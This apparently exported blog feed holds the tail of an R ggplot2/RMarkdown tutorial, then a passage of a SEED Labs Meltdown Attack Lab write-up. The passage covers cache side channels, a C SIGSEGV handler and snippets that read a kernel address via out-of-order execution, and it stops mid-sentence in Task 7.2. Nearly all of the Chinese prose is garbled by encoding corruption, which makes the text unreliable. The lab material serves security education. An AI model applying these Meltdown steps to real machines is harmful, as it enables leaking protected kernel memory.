ä½•å¯¹è±¡ï¼ˆgeomï¼‰ï¼šç”¨æ¥æè¿°æ•°æ®ä¸­æ¯ä¸ªç‚¹ã€çº¿ã€çŸ©å½¢ç­‰å‡ ä½•å…ƒç´ çš„å½¢çŠ¶å’Œä½ç½®ã€‚</li><li>ç¾å­¦æ˜ å°„ï¼ˆaestheticsï¼‰ï¼šå°†æ•°æ®ä¸­çš„å˜é‡æ˜ å°„åˆ°é¢œè‰²ã€å½¢çŠ¶ã€å¤§å°ç­‰å¯è§†åŒ–å±æ€§ä¸Šã€‚</li></ol><p>ä»¥ä¸€æ®µä»£ç ä¸ºä¾‹</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs r">library(ggplot2)<br>ggplot(data = mtcars, aes(x = wt, y = mpg)) + <br>  geom_point(color = <span class="hljs-string">&quot;blue&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li><p>ggplot å‡½æ•°ç”¨æ¥åˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„ç©ºç™½å›¾å±‚ï¼Œå…¶ä¸­åŒ…æ‹¬äº†æ•°æ®é›†å’Œç¾å­¦æ˜ å°„çš„å®šä¹‰</p><ul><li>dataï¼šè¡¨ç¤ºä¼ å…¥çš„æ•°æ®é›†</li><li>aes()ï¼šè¡¨ç¤ºç¾å­¦æ˜ å°„ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªç”¨é€—å·éš”å¼€çš„å­—ç¬¦å˜é‡åˆ—è¡¨ï¼ŒæŒ‡å®šäº†æ•°æ®ä¸­çš„å“ªäº›å˜é‡è¦æ˜ å°„åˆ°å›¾å½¢å±æ€§ä¸Š</li></ul></li><li><p>å‡ ä½•å¯¹è±¡å‡½æ•°ï¼ˆgeom_*ï¼‰ã€‚æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚geom_point() ç”¨æ¥ç»˜åˆ¶æ•£ç‚¹å›¾ï¼Œgeom_line() ç”¨æ¥ç»˜åˆ¶çº¿æ€§å›¾</p></li><li><p>æ¯ä¸ª ggplot å‡½æ•°éƒ½å¯ä»¥é€šè¿‡åŠ ä¸Šå„ç§å›¾å±‚æ¥æ„æˆæ›´åŠ ä¸°å¯Œçš„å¯è§†åŒ–æ•ˆæœã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ facet_grid() å‡½æ•°ä¸ºå›¾åƒæ·»åŠ é•¶åµŒé¢æ¿ã€ä½¿ç”¨ scale_color_gradient() å‡½æ•°æ¥è°ƒæ•´é¢œè‰²æ¸å˜ä»¥åŠä½¿ç”¨ theme() æ¥ä¿®æ”¹è½´æ ‡ç­¾å’Œæ ‡é¢˜çš„æ ·å¼ç­‰ã€‚</p></li></ul><h1 id="å°†Rmdæ–‡ä»¶è¾“å‡ºä¸ºPDFæ–‡ä»¶"><a href="#å°†Rmdæ–‡ä»¶è¾“å‡ºä¸ºPDFæ–‡ä»¶" class="headerlink" title="å°†Rmdæ–‡ä»¶è¾“å‡ºä¸ºPDFæ–‡ä»¶"></a>å°†Rmdæ–‡ä»¶è¾“å‡ºä¸ºPDFæ–‡ä»¶</h1><p>åœ¨ R è¯­è¨€ä¸­ï¼Œ<code>knit</code> æ˜¯ä¸€ä¸ªç”¨äºå°† RMarkdown æ–‡æ¡£è½¬æ¢ä¸ºçº¯æ–‡æœ¬æˆ–å…¶ä»–æ ¼å¼çš„å‡½æ•°ã€‚å…·ä½“æ¥è¯´ï¼Œ<code>knit</code> å‡½æ•°ä¼šè¯»å– RMarkdown æ–‡æ¡£ä¸­çš„ R ä»£ç å—ï¼Œå¹¶æ‰§è¡Œè¿™äº›ä»£ç å—ã€‚ç„¶åï¼Œå®ƒä¼šå°†æ‰§è¡Œç»“æœï¼ˆä¾‹å¦‚è®¡ç®—ç»“æœã€å›¾è¡¨ã€è¡¨æ ¼ç­‰ï¼‰åµŒå…¥åˆ° Markdown æˆ– LaTeX æ ¼å¼çš„æ–‡æœ¬ä¸­ï¼Œå¹¶ç”Ÿæˆæœ€ç»ˆçš„è¾“å‡ºæ–‡ä»¶</p><p>è¦æ­£ç¡®ä½¿ç”¨ <code>knit</code> å‡½æ•°ï¼Œä½ éœ€è¦å…ˆå®‰è£…å¹¶åŠ è½½ <code>knitr</code> åŒ…ï¼Œå¯ä»¥ä½¿ç”¨ â€œKnitâ€ å·¥å…·æŒ‰é’®è°ƒç”¨ <code>knit</code> å‡½æ•°ï¼Œå¹¶é€šè¿‡è®¾ç½® â€œKnitâ€ æŒ‰é’®ä¸‹æ‹‰èœå•ä¸­çš„é€‰é¡¹æ¥æŒ‡å®šè¾“å‡ºæ ¼å¼å’Œå…¶ä»–é€‰é¡¹</p><p>åœ¨ R è¯­è¨€ç¼–è¯‘ rmd æ–‡ä»¶çš„è¿‡ç¨‹ä¸­ï¼ŒLaTeX èµ·åˆ°äº†å°† Markdown è¯­æ³•è½¬æ¢ä¸º PDF æ–‡æ¡£çš„ä½œç”¨ã€‚å…·ä½“æ¥è¯´ï¼Œå½“ä½ ä½¿ç”¨ <code>pdf_document</code> æˆ– <code>beamer_presentation</code> ç­‰è¾“å‡ºæ ¼å¼æ—¶ï¼ŒRMarkdown ä¼šå°†æºæ–‡æ¡£è½¬æ¢ä¸º LaTeX æ ¼å¼ï¼Œå¹¶ä½¿ç”¨ LaTeX è¿›è¡Œç¼–è¯‘ç”Ÿæˆæœ€ç»ˆçš„ PDF è¾“å‡º</p><p>ä¸ºäº†ç¼–è¯‘å‡ºPDFï¼Œéœ€è¦æ­£ç¡®è®¾ç½®latexçš„ç¼–è¯‘å™¨ï¼Œåœ¨æ–‡ä»¶å¼€å¤´å¯ä»¥åŠ å‡ è¡Œyamlæ¥æŒ‡å®šï¼Œä¸‹é¢æŒ‡å®šäº†xelatexï¼Œxelatexå¯ä»¥è§£å†³ä¸èƒ½ç¼–è¯‘å‡ºä¸­æ–‡å­—ç¬¦çš„é—®é¢˜ã€‚è¦æ³¨æ„ä¸‹é¢çš„ç¼©è¿›æ˜¯ä¸èƒ½æ›´æ”¹çš„ï¼ˆè¢«è¿™ä¸ªå¡äº†å¾ˆä¹…</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs r">---<br>title: <span class="hljs-string">&quot;My Document&quot;</span><br>output:<br>  pdf_document:<br>    latex_engine: xelatex<br>---<br><br><span class="hljs-comment"># Section 1</span><br><br>Some text.<br><br>â€‹```&#123;r&#125;<br>summary(cars)<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://bookdown.org/wangminjie/R4DS/index.html">https://bookdown.org/wangminjie/R4DS/index.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>seedlabï¼šMeltdown Attack Lab</title>
    <link href="/p/a6055774/"/>
    <url>/p/a6055774/</url>
    
    <content type="html"><![CDATA[<h1 id="Lab-Environment"><a href="#Lab-Environment" class="headerlink" title="Lab Environment"></a>Lab Environment</h1><ul><li>ç†”æ–­æ¼æ´æ˜¯è‹±ç‰¹å°” CPU å†…éƒ¨çš„ä¸€ä¸ªç¼ºé™·ï¼Œå¯¹ AMD æœºå™¨æ— æ•ˆ</li><li>ç†”æ–­å’Œå¹½çµæ”»å‡»éƒ½ä½¿ç”¨ CPU ç¼“å­˜ä½œä¸ºä¾§é€šé“çªƒå–å—ä¿æŠ¤çš„ä¿¡æ¯</li><li>seedé¢„å…ˆæ„å»ºçš„è™šæ‹Ÿæœºæä¾›äº†ç¯å¢ƒï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ Ubuntu 16.04 VMä»¥å®Œæˆå®éªŒï¼Œæ³¨æ„ä¸è¦æ›´æ–°è™šæ‹Ÿæœºçš„æ“ä½œç³»ç»Ÿ</li><li>ä½¿ç”¨<code>gcc -march=native -o myprog myprog.c</code>å‘½ä»¤å»ç¼–è¯‘ç¨‹åºï¼Œè¿™é‡Œ-march=nativeè¡¨ç¤ºå¯ç”¨æœ¬åœ°æœºå™¨æ”¯æŒçš„æ‰€æœ‰æŒ‡ä»¤å­é›†</li></ul><h1 id="Task-1-Reading-from-Cache-versus-from-Memory"><a href="#Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="Task 1: Reading from Cache versus from Memory"></a>Task 1: Reading from Cache versus from Memory</h1><p>å¤šæ¬¡è¿è¡Œï¼Œè§‚å¯Ÿå‘ç°æ¯æ¬¡<code>[3*4096]</code>å’Œ<code>[7*4096]</code>çš„CPU cycleséƒ½æ˜¯æœ€å°‘çš„</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230124101340.png"></p><h1 id="Task-2-Using-Cache-as-a-Side-Channel"><a href="#Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="Task 2: Using Cache as a Side Channel"></a>Task 2: Using Cache as a Side Channel</h1><ul><li>secretæ˜¯ä¸€ä¸ªä¸€å­—èŠ‚çš„ç§˜å¯†å€¼ï¼Œæˆ‘ä»¬é€šè¿‡cacheçš„ä¾§ä¿¡é“æ”»å‡»æ–¹å¼çŒœå‡ºè¯¥å€¼</li><li>ä¸€å­—èŠ‚ä¸€å…±æœ‰256ç§å¯èƒ½ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºå¤§å°ä¸º256*4096+1024çš„æ•°ç»„ï¼Œç”±äºè®¿é—®è¿‡[secret*4096 + 1024]ä¹‹åï¼Œè¯¥å€¼ä¼šè¢«cacheï¼Œå› æ­¤å¯ä»¥é€šè¿‡å¾ªç¯çš„æ–¹å¼ä¾æ¬¡è®¿é—®[i]*4096+1024ï¼Œä½¿ç”¨æ—¶é—´æœ€çŸ­çš„iå°±æ˜¯è¢«cacheçš„secretå€¼<ul><li>ä¹‹æ‰€ä»¥ä½¿ç”¨4096ï¼Œæ˜¯å› ä¸ºå®ƒæ¯”å…¸å‹çš„ç¼“å­˜å—å¤§(64å­—èŠ‚) ï¼Œç¼“å­˜æ˜¯åœ¨å—çº§åˆ«å®Œæˆçš„ï¼Œè€Œä¸æ˜¯åœ¨å­—èŠ‚çº§åˆ«ï¼Œå› æ­¤å®šä¹‰ä¸€ä¸ªåŒ…å«256ä¸ªå…ƒç´ çš„æ•°ç»„(å³ array [256])æ˜¯è¡Œä¸é€šçš„</li><li>ä¹‹æ‰€ä»¥ä½¿ç”¨1024ï¼Œæ˜¯å› ä¸º[0 * 4096]å¯èƒ½ä¸ç›¸é‚»å†…å­˜ä¸­çš„å˜é‡ä½äºç›¸åŒçš„ç¼“å­˜å—ä¸­ï¼Œä¸ºäº†é¿å…ä¸å˜é‡cacheåˆ°ç›¸åŒçš„å—ä¸­ï¼Œ[i*4096]éœ€è¦åŠ ä¸Š1024çš„åç§»</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230124151051.png"></p><h1 id="Task-3-Place-Secret-Data-in-Kernel-Space"><a href="#Task-3-Place-Secret-Data-in-Kernel-Space" class="headerlink" title="Task 3: Place Secret Data in Kernel Space"></a>Task 3: Place Secret Data in Kernel Space</h1><p>MeltdownKernel.cä½¿ç”¨ä¸€ä¸ªå†…æ ¸æ¨¡å—æ¥å­˜å‚¨ç§˜å¯†æ•°æ®</p><p>ç¼–è¯‘ã€å®‰è£…å†…æ ¸æ¨¡å—ï¼Œä½¿ç”¨ dmesg å‘½ä»¤ä»å†…æ ¸æ¶ˆæ¯ç¼“å†²åŒºä¸­æŸ¥æ‰¾ç§˜å¯†æ•°æ®çš„åœ°å€secret data addressï¼š0xf9dcd000</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230128174009.png"></p><p>ç”¨æˆ·çº§ç¨‹åºè°ƒç”¨å†…æ ¸æ¨¡å—ä¸­çš„å‡½æ•°ã€‚æ­¤å‡½æ•°å°†è®¿é—®æœºå¯†æ•°æ®ï¼Œè€Œä¸ä¼šå°†å…¶æ³„éœ²ç»™ç”¨æˆ·çº§ç¨‹åºã€‚è¿™ç§è®¿é—®çš„å‰¯ä½œç”¨æ˜¯ç§˜å¯†æ•°æ®ç°åœ¨ä½äº CPU ç¼“å­˜ä¸­</p><h1 id="Task-4-Access-Kernel-Memory-from-User-Space"><a href="#Task-4-Access-Kernel-Memory-from-User-Space" class="headerlink" title="Task 4: Access Kernel Memory from User Space"></a>Task 4: Access Kernel Memory from User Space</h1><p>ç”±äºç”¨æˆ·ç©ºé—´ç¨‹åºæ— æ³•ç›´æ¥è®¿é—®å†…æ ¸åœ°å€çš„æ•°æ®ï¼Œå› æ­¤ä¼šå¯¼è‡´segment fault</p><blockquote><p>è®¿é—®è¢«ç¦æ­¢çš„å†…å­˜ä½ç½®å°†å‘å‡º SIGSEGV ä¿¡å·; å¦‚æœç¨‹åºä¸è‡ªå·±å¤„ç†è¿™ä¸ªå¼‚å¸¸ï¼Œæ“ä½œç³»ç»Ÿå°†å¤„ç†å®ƒå¹¶ç»ˆæ­¢ç¨‹åºã€‚è¿™å°±æ˜¯ç¨‹åºå´©æºƒçš„åŸå› </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230128194724.png"></p><h1 id="Task-5-Handle-Error-Exceptions-in-C"><a href="#Task-5-Handle-Error-Exceptions-in-C" class="headerlink" title="Task 5: Handle Error/Exceptions in C"></a>Task 5: Handle Error/Exceptions in C</h1><p>ä¸ºäº†é¿å…task4ä¸­çš„segment faultï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºä¸­å®šä¹‰æˆ‘ä»¬è‡ªå·±çš„ä¿¡å·å¤„ç†ç¨‹åºæ¥æ•è·ç”±é”™è¯¯äº‹ä»¶å¼•å‘çš„å¼‚å¸¸ï¼Œä»è€Œé˜²æ­¢ç¨‹åºå› é”™è¯¯äº‹ä»¶è€Œå´©æºƒã€‚è®¿é—®è¢«ç¦æ­¢çš„å†…å­˜ä½ç½®å°†å‘å‡º SIGSEGV ä¿¡å·</p><p>ä¸ C + + æˆ–å…¶ä»–é«˜çº§è¯­è¨€ä¸åŒï¼ŒC ä¸ç›´æ¥æ”¯æŒé”™è¯¯å¤„ç†(ä¹Ÿç§°ä¸ºå¼‚å¸¸å¤„ç†) ï¼Œä¾‹å¦‚ try/catch å­å¥ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ sigsetjmp ()å’Œ siglongjmp()æ¥æ¨¡æ‹Ÿ try/catch å­å¥</p><p>å…³äºä»£ç çš„å‡ ç‚¹æ³¨é‡Šï¼š</p><ul><li><strong>setjmp</strong>() saves the stack context/environment in <em>env</em>ï¼Œ<strong>sigsetjmp</strong>() is similar to <strong>setjmp</strong>(). If, and only if, <em>savesigs</em> is nonzero, the processâ€™s current signal mask is saved in <em>env</em> and will be restored if a <strong><a href="https://linux.die.net/man/3/siglongjmp">siglongjmp</a></strong>(3) is later performed with this <em>env</em>ã€‚å¦‚æœå¸Œæœ›å¯ç§»æ¤åœ°ä¿å­˜å’Œæ¢å¤ä¿¡å·æ©ç ï¼Œä½¿ç”¨ sigsetjmp ()å’Œ siglongjmp (3)</li><li>è®¾ç½®ä¿¡å·å¤„ç†ï¼šsignal(SIGSEGV, catch_segv)æ³¨å†Œä¸€ä¸ª SIGSEGV ä¿¡å·å¤„ç†ç¨‹åºï¼Œè¿™æ ·å½“ä¸€ä¸ª SIGSEGV ä¿¡å·è¢«å¼•å‘æ—¶ï¼Œå¤„ç†ç¨‹åºå‡½æ•° catch Segv ()å°†è¢«è°ƒç”¨</li><li>è®¾ç½®æ£€æŸ¥ç‚¹ï¼šåœ¨ä¿¡å·å¤„ç†ç¨‹åºå®Œæˆå¯¹å¼‚å¸¸çš„å¤„ç†ä¹‹åï¼Œå®ƒéœ€è¦è®©ç¨‹åºä»ç‰¹å®šçš„æ£€æŸ¥ç‚¹ç»§ç»­æ‰§è¡Œã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆå®šä¹‰ä¸€ä¸ªæ£€æŸ¥ç‚¹ã€‚ä½¿ç”¨ sigsetjmp ()å®ç°çš„: sigsetjmp (jbufï¼Œ1)å°†å †æ ˆä¸Šä¸‹æ–‡/ç¯å¢ƒä¿å­˜åœ¨ jbuf ä¸­ï¼Œä»¥ä¾› siglongjmp ()ç¨åä½¿ç”¨ã€‚å‚è€ƒï¼š<a href="https://pubs.opengroup.org/onlinepubs/7908799/xsh/sigsetjmp.html">https://pubs.opengroup.org/onlinepubs/7908799/xsh/sigsetjmp.html</a></li><li>roll backåˆ°ä¸€ä¸ªæ£€æŸ¥ç‚¹: å½“è°ƒç”¨ siglongjmp (jbufï¼Œ1)æ—¶ï¼Œä¿å­˜åœ¨ jbuf å˜é‡ä¸­çš„çŠ¶æ€è¢«å¤åˆ¶å›å¤„ç†å™¨ï¼Œè®¡ç®—ä» sigsetjmp ()å‡½æ•°çš„è¿”å›ç‚¹å¼€å§‹ï¼Œä½†æ˜¯ sigsetjmp ()å‡½æ•°çš„è¿”å›å€¼æ˜¯ siglongjmp ()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­æ˜¯1ã€‚å› æ­¤ï¼Œåœ¨å¼‚å¸¸å¤„ç†ä¹‹åï¼Œç¨‹åºç»§ç»­ä» else åˆ†æ”¯æ‰§è¡Œ</li><li>è§¦å‘å¼‚å¸¸: <code>char kernel_data = *(char*)kernel_data_addr; </code>å¤„çš„ä»£ç å°†è§¦å‘ä¸€ä¸ª SIGSEGV ä¿¡å·ï¼Œè¿™æ˜¯ç”±äºå†…å­˜è®¿é—®å†²çª(ç”¨æˆ·çº§ç¨‹åºä¸èƒ½è®¿é—®å†…æ ¸å†…å­˜)</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;setjmp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setjmp</span><span class="hljs-params">(jmp_buf env)</span></span>; <span class="hljs-comment">//å‚æ•°envä¸ºç”¨æ¥ä¿å­˜ç›®å‰å †æ ˆç¯å¢ƒ</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigsetjmp</span><span class="hljs-params">(sigjmp_buf env, <span class="hljs-keyword">int</span> savesigs)</span></span>; <br><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> sigjmp_buf jbuf;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">catch_segv</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// Roll back to the checkpoint set by sigsetjmp().</span><br>  siglongjmp(jbuf, <span class="hljs-number">1</span>);                         <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <br>  <span class="hljs-comment">// The address of our secret data</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> kernel_data_addr = <span class="hljs-number">0xfb61b000</span>;<br><br>  <span class="hljs-comment">// Register a signal handler</span><br>  signal(SIGSEGV, catch_segv);                     <br><br>  <span class="hljs-comment">//setjmp() and sigsetjmp() return 0 if returning directly</span><br>  <span class="hljs-keyword">if</span> (sigsetjmp(jbuf, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123;               <br>     <span class="hljs-comment">// A SIGSEGV signal will be raised. </span><br>     <span class="hljs-keyword">char</span> kernel_data = *(<span class="hljs-keyword">char</span>*)kernel_data_addr; <br><br>     <span class="hljs-comment">// The following statement will not be executed.</span><br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Kernel data at address %lu is: %c\n&quot;</span>, <br>                    kernel_data_addr, kernel_data);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory access violation!\n&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program continues to execute.\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œåè¾“å‡ºï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Memory <span class="hljs-keyword">access</span> violation!<br>Program continues <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span>.<br></code></pre></td></tr></table></figure><h1 id="Task-6-Out-of-Order-Execution-by-CPU"><a href="#Task-6-Out-of-Order-Execution-by-CPU" class="headerlink" title="Task 6: Out-of-Order Execution by CPU"></a>Task 6: Out-of-Order Execution by CPU</h1><p>è¿™ä¸ªä»»åŠ¡æ˜¯ä¸ºäº†éªŒè¯ä¹±åºæ‰§è¡Œçš„å­˜åœ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> number = <span class="hljs-number">0</span>;<br><span class="hljs-number">2</span> kernel_address = (<span class="hljs-keyword">char</span>*)<span class="hljs-number">0xfb61b000</span>;<br><span class="hljs-number">3</span> kernel_data = *kernel_address;<span class="hljs-comment">//æ¶‰åŠä¸¤ä¸ªæ“ä½œ: åŠ è½½æ•°æ®(é€šå¸¸åŠ è½½åˆ°å¯„å­˜å™¨ä¸­) ï¼Œä»¥åŠæ£€æŸ¥æ˜¯å¦å…è®¸æ•°æ®è®¿é—®</span><br><span class="hljs-number">4</span> number = number + kernel_data;<br></code></pre></td></tr></table></figure><p>å¯¹äºå¦‚ä¸Šè¯­å¥ï¼Œç¬¬3è¡Œå°†å¼•å‘ä¸€ä¸ªå¼‚å¸¸ï¼Œå› ä¸ºåœ°å€ä¸º0xfb61b000çš„å†…å­˜å±äºå†…æ ¸ã€‚å› æ­¤ï¼Œæ‰§è¡Œå°†åœ¨ç¬¬3è¡Œè¢«ä¸­æ–­ï¼Œè€Œç¬¬4è¡Œå°†æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥æ•°å­—å˜é‡çš„å€¼ä»ç„¶æ˜¯0</p><p>ç„¶è€Œï¼Œç°ä»£é«˜æ€§èƒ½ CPU ä¸å†ä¸¥æ ¼æŒ‰ç…§æŒ‡ä»¤çš„åŸå§‹é¡ºåºæ‰§è¡ŒæŒ‡ä»¤ï¼Œè€Œæ˜¯å…è®¸ä¹±åºæ‰§è¡Œè€—å°½æ‰€æœ‰çš„æ‰§è¡Œå•å…ƒã€‚ç¬¬3è¡Œæ¶‰åŠä¸¤ä¸ªæ“ä½œ: åŠ è½½æ•°æ®(é€šå¸¸åŠ è½½åˆ°å¯„å­˜å™¨ä¸­) ï¼Œä»¥åŠæ£€æŸ¥æ˜¯å¦å…è®¸æ•°æ®è®¿é—®ã€‚<strong>å¦‚æœæ•°æ®å·²ç»åœ¨ CPU ç¼“å­˜ä¸­ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªæ“ä½œå°†éå¸¸å¿«ï¼Œè€Œç¬¬äºŒä¸ªæ“ä½œå¯èƒ½éœ€è¦ä¸€æ®µæ—¶é—´ã€‚ä¸ºäº†é¿å…ç­‰å¾…ï¼ŒCPU å°†ç»§ç»­æ‰§è¡Œç¬¬4è¡Œå’Œåç»­æŒ‡ä»¤ï¼ŒåŒæ—¶å¹¶è¡Œæ‰§è¡Œè®¿é—®æ£€æŸ¥</strong>ã€‚è¿™æ˜¯ä¹±åºæ‰§è¡Œã€‚åœ¨è®¿é—®æ£€æŸ¥å®Œæˆä¹‹å‰ï¼Œä¸ä¼šæäº¤æ‰§è¡Œç»“æœã€‚ç”±äºè®¿é—®äº†å†…æ ¸æ•°æ®ï¼Œæ£€æŸ¥å¤±è´¥äº†ï¼Œå› æ­¤ç”±ä¹±åºæ‰§è¡Œå¼•èµ·çš„æ‰€æœ‰ç»“æœéƒ½å°†è¢«ä¸¢å¼ƒï¼Œå°±åƒä»æœªå‘ç”Ÿè¿‡ä¸€æ ·ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä»å¤–é¢æˆ‘ä»¬çœ‹ä¸åˆ°ç¬¬å››è¡Œè¢«æ‰§è¡Œçš„åŸå› </p><p><code>meltdown(0xfb61b000); </code>è¯­å¥è°ƒç”¨äº†meltdownå‡½æ•°ï¼Œå°½ç®¡è¯¥å‡½æ•°å†…çš„éæ³•å†…å­˜è®¿é—®ä¼šå¯¼è‡´å¼‚å¸¸ï¼Œä½†æ˜¯ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¹Ÿå³æ˜¯<code>array[7 * 4096 + DELTA] += 1;</code>ç”±äºCPUä¹±åºæ‰§è¡Œæœºåˆ¶ä»ç„¶ä¼šè¿è¡Œï¼Œä»è€Œå°†7çº³å…¥cacheï¼Œä¹‹åæˆ‘ä»¬è°ƒç”¨reloadSideChannelå¯ä»¥å¾—å‡ºç§˜å¯†å€¼æ˜¯7</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230129200746.png"></p><h1 id="Task-7-The-Basic-Meltdown-Attack"><a href="#Task-7-The-Basic-Meltdown-Attack" class="headerlink" title="Task 7: The Basic Meltdown Attack"></a>Task 7: The Basic Meltdown Attack</h1><h2 id="Task-7-1-A-Naive-Approach"><a href="#Task-7-1-A-Naive-Approach" class="headerlink" title="Task 7.1: A Naive Approach"></a>Task 7.1: A Naive Approach</h2><p>æ˜¾ç¤º Memory access violation</p><h2 id="Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached"><a href="#Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached" class="headerlink" title="Task 7.2: Improve the Attack by Getting the Secret Data Cached"></a>Task 7.2: Improve the Attack by Getting the Secret Data Cached</h2><p>ç†”æ–­æ¼æ´æ˜¯ä¸€ä¸ªç«äº‰æ¡ä»¶çš„æ¼æ´ï¼Œå…¶ä¸­åŒ…æ‹¬ç«äº‰æ¡ä»¶ä¹‹é—´çš„ä¹±åºæ‰§è¡Œå’Œè®¿é—®æ£€æŸ¥ã€‚ä¹±åºæ‰§è¡Œè¶Šå¿«ï¼Œæˆ‘ä»¬èƒ½æ‰§è¡Œçš„æŒ‡ä»¤å°±è¶Šå¤šï¼Œæˆ‘ä»¬å°±è¶Šæœ‰å¯èƒ½åˆ›é€ å‡ºå¯è§‚å¯Ÿåˆ°çš„æ•ˆæœï¼Œå¸®åŠ©æˆ‘ä»¬å¾—åˆ°ç§˜å¯†æ•°æ®</p><p>åœ¨æˆ‘ä»¬çš„ä»£ç ä¸­ï¼Œä¹±åºæ‰§è¡Œçš„ç¬¬ä¸€æ­¥æ˜¯å°†å†…æ ¸æ•°æ®åŠ è½½åˆ°ä¸€ä¸ªå¯„å­˜å™¨ä¸­ã€‚åŒæ—¶ï¼Œå¯¹è¿™æ ·çš„è®¿é—®æ‰§è¡Œå®‰å…¨æ£€æŸ¥ã€‚å¦‚æœæ•°æ®åŠ è½½æ…¢äºå®‰å…¨æ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å®‰å…¨æ£€æŸ¥å®Œæˆæ—¶ï¼Œå› ä¸ºè®¿é—®æ£€æŸ¥å¤±è´¥ï¼Œå†…æ 